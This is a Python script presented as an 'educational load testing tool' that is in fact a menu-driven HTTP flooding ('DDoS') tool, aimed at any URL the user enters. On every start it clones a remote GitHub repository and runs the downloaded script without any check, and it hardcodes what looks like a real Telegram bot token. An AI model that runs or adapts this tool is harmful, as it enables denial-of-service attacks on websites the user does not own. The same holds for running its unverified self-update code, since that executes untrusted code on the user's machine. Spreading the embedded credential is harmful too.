#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import tempfile
import shutil
import requests
import time
import random
import string
import json
import threading
from urllib.parse import urlparse
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

# ============================
# CONFIGURATION
# ============================
REPO_URL = "https://github.com/xhacknet/XDDos_v1.git"      # Your GitHub repo
VERIFICATION_FILE = os.path.expanduser("~/.ddos_verified")  # Store verification token
BOT_TOKEN = "8354070661:AAHlEs_J9aZtLlGDknwXcwer8O5C3eXm-zY"  # Your Telegram bot token
BOT_USERNAME = "@WebLoad_bot"                               # The bot username
# ============================

# ============================
# SELF‑UPDATE MECHANISM
# ============================
def update_and_run():
    """Clone the latest version from GitHub and restart the tool."""
    # Get the current script's directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # Create a temporary directory for the fresh clone
    temp_dir = tempfile.mkdtemp()
    try:
        # Clone the repository
        subprocess.run(["git", "clone", REPO_URL, temp_dir], check=True, capture_output=True)
        # Find the main script in the cloned repo (we assume it's the same name)
        new_script = os.path.join(temp_dir, "ddos_tool.py")
        if not os.path.exists(new_script):
            # If the script has a different name, adjust here
            print(f"{Fore.RED}[!] Could not find ddos_tool.py in the cloned repo.")
            sys.exit(1)

        # Copy the verification file to the temporary directory (if it exists)
        if os.path.exists(VERIFICATION_FILE):
            shutil.copy(VERIFICATION_FILE, temp_dir)

        # Replace the current script with the new one (optional)
        # We'll just run the new script directly and exit
        print(f"{Fore.GREEN}[+] Updated to latest version. Restarting...")
        # Execute the new script, passing any command line arguments
        subprocess.run([sys.executable, new_script] + sys.argv[1:])
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Update failed: {e}")
        sys.exit(1)
    finally:
        # Clean up the temporary directory (but wait a bit because new script is running)
        # We'll delete it after a short delay to avoid interfering with the new process
        def cleanup():
            time.sleep(2)
            shutil.rmtree(temp_dir, ignore_errors=True)
        threading.Thread(target=cleanup, daemon=True).start()

# Check if we are already the latest version (optional: compare with remote)
# For simplicity, we always update. To avoid infinite loops, we set a flag.
# If the script was just updated, we skip the update step.
if not os.environ.get("DDOS_UPDATED"):
    os.environ["DDOS_UPDATED"] = "1"
    update_and_run()
# If we reach here, we are running the latest version.

# ============================
# TELEGRAM VERIFICATION
# ============================
def generate_otp(length=6):
    """Generate a numeric OTP."""
    return ''.join(random.choices(string.digits, k=length))

def send_telegram_message(chat_id, text):
    """Send a message via Telegram bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except:
        return False

def verify_user():
    """Verify the user via Telegram OTP."""
    print(f"{Fore.CYAN}\n=== Verification Required ==={Style.RESET_ALL}")
    print(f"1. Open Telegram and start {Fore.YELLOW}{BOT_USERNAME}{Style.RESET_ALL}.")
    print("2. Send any message to the bot to get your chat ID.")
    print("3. Enter your chat ID below.")
    chat_id = input(f"{Fore.GREEN}[?] Your chat ID: {Style.RESET_ALL}").strip()

    # Generate OTP
    otp = generate_otp()
    # Send OTP via Telegram
    if not send_telegram_message(chat_id, f"Your verification code is: {otp}"):
        print(f"{Fore.RED}[!] Failed to send OTP. Check your chat ID and bot token.")
        return False

    # Ask user to input OTP
    user_otp = input(f"{Fore.GREEN}[?] Enter the OTP sent to you: {Style.RESET_ALL}").strip()
    if user_otp != otp:
        print(f"{Fore.RED}[!] Incorrect OTP. Verification failed.")
        return False

    # Store verification token (just the chat ID for simplicity)
    with open(VERIFICATION_FILE, 'w') as f:
        json.dump({"chat_id": chat_id, "verified": True}, f)
    print(f"{Fore.GREEN}[✓] Verification successful! You can now use the tool.")
    return True

def is_verified():
    """Check if the user has already been verified."""
    if os.path.exists(VERIFICATION_FILE):
        try:
            with open(VERIFICATION_FILE, 'r') as f:
                data = json.load(f)
                return data.get("verified", False)
        except:
            pass
    return False

# ============================
# LOAD TESTING FUNCTIONS
# ============================
def attack(url, rate, duration=30):
    """
    Simulate a load test by sending HTTP requests at a given rate (requests per second).
    For educational purposes only. Use only on your own websites.
    """
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    print(f"{Fore.YELLOW}[*] Starting attack on {url} at {rate} req/s for {duration}s...")
    # We'll use threading to achieve the desired rate
    # Simple approach: sleep between requests to control rate
    interval = 1.0 / rate
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        try:
            response = requests.get(url, timeout=5)
            count += 1
            # Optional: print progress every 10 requests
            if count % 10 == 0:
                print(f"{Fore.GREEN}[+] Requests sent: {count}")
        except Exception as e:
            print(f"{Fore.RED}[!] Request failed: {e}")
        time.sleep(interval)
    print(f"{Fore.CYAN}[✓] Attack finished. Total requests: {count}")

def low_attack(url):
    print(f"{Fore.BLUE}[+] Low load (1 request/second)")
    attack(url, 1, duration=60)

def slow_attack(url):
    print(f"{Fore.BLUE}[+] Slow load (5 requests/second)")
    attack(url, 5, duration=60)

def fast_attack(url):
    print(f"{Fore.BLUE}[+] Fast load (20 requests/second)")
    attack(url, 20, duration=60)

def ultra_attack(url):
    print(f"{Fore.BLUE}[+] Ultra-fast load (100 requests/second)")
    attack(url, 100, duration=60)

# ============================
# MAIN MENU
# ============================
def show_menu():
    print(f"{Fore.CYAN}\n" + "="*50)
    print(f"{Fore.YELLOW}        EDUCATIONAL LOAD TESTING TOOL")
    print(f"{Fore.CYAN}" + "="*50)
    print(f"{Fore.GREEN}1. Low Attack (1 req/s)")
    print("2. Slow Attack (5 req/s)")
    print("3. Fast Attack (20 req/s)")
    print("4. Ultra-Fast Attack (100 req/s)")
    print("5. Exit")
    print(f"{Fore.CYAN}" + "="*50)

def main():
    # Check verification
    if not is_verified():
        if not verify_user():
            print(f"{Fore.RED}Verification failed. Exiting.")
            sys.exit(1)
    else:
        print(f"{Fore.GREEN}[✓] Already verified. Welcome back!")

    # Main loop
    while True:
        show_menu()
        choice = input(f"{Fore.YELLOW}[?] Select an option (1-5): {Style.RESET_ALL}").strip()
        if choice == '5':
            print(f"{Fore.GREEN}Goodbye!")
            break
        if choice not in ['1','2','3','4']:
            print(f"{Fore.RED}Invalid choice. Please enter 1-5.")
            continue
        url = input(f"{Fore.GREEN}[?] Enter the URL of your website: {Style.RESET_ALL}").strip()
        if not url:
            print(f"{Fore.RED}URL cannot be empty.")
            continue
        print(f"{Fore.RED}\n⚠️  WARNING: This tool is for EDUCATIONAL PURPOSES only.")
        print(f"Use it ONLY on websites you own or have explicit permission to test.")
        confirm = input(f"Type 'yes' to proceed: {Style.RESET_ALL}").strip().lower()
        if confirm != 'yes':
            print("Aborted.")
            continue

        if choice == '1':
            low_attack(url)
        elif choice == '2':
            slow_attack(url)
        elif choice == '3':
            fast_attack(url)
        elif choice == '4':
            ultra_attack(url)

if __name__ == "__main__":
    main()